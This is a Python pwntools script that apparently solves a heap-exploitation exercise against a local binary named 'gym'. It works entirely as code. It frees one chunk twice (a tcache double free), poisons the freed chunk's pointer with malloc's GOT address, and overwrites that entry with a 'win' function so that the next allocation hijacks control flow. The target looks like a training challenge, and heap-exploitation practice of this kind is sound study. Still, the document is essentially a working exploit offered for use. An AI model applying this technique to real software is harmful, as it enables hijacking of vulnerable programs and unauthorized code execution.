#!/usr/bin/python3
# ./attack.py GDB or ./attack.py
from pwn import process, gdb, args, p64, ELF

binary = './gym'

gs = """
break main
continue
"""

e = ELF(binary)

END_OF_MENU = "e.g, l\n"


def malloc(p):
    p.sendline(b"m 8")
    print("m 8")
    print(p.recvuntil(END_OF_MENU).decode())


def free(p, index):
    p.sendline(b"f %d" % index)
    print("free")
    print(p.recvuntil(END_OF_MENU).decode())


def edit(p, index, content):
    p.sendline(b"e %d %b" % (index, content))
    print("edit ")
    print(p.recvuntil(END_OF_MENU).decode())


def exit(p):
    p.sendline(b"0")


def launch_attack(p):
    p.recvuntil(END_OF_MENU)
    # 1. allocate a chunk 0x400 -> 0x410 (tcache)
    malloc(p)
    # 2. free the chunk
    free(p, 0)
    # 3. free the chunk
    free(p, 0)
    # 4. malloc the chunk
    malloc(p)  # index of pointer: 1
    # 5. edit the chunk to e.got["malloc"]
    edit(p, 1, p64(e.got["malloc"]))
    # 6. malloc * 2
    malloc(p)  # index of pointer: 2
    malloc(p)  # index of pointer: 3, victim pointer
    # 7. [victim] = e.symbol["win"]
    edit(p, 3, p64(e.symbols.win))
    # TRIGGER
    p.sendline(b"m 8")
    p.recvline()
    print(p.recvline())


def main():
    if args.GDB:
        p = gdb.debug(binary, gdbscript=gs)
    else:
        p = process(binary)

    launch_attack(p)

    # Make sure that this is kept for gdb
    # p.interactive()


if __name__ == "__main__":
    main()
